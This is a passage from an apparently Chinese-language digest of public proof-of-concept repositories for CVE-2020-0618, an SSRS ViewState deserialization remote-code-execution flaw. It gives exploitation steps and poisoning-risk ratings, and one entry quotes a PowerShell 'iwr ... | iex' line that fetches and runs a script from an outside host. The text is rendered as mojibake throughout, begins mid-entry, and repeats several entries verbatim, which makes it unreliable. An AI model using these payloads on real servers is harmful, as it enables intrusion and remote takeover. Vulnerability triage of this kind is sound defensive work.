4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

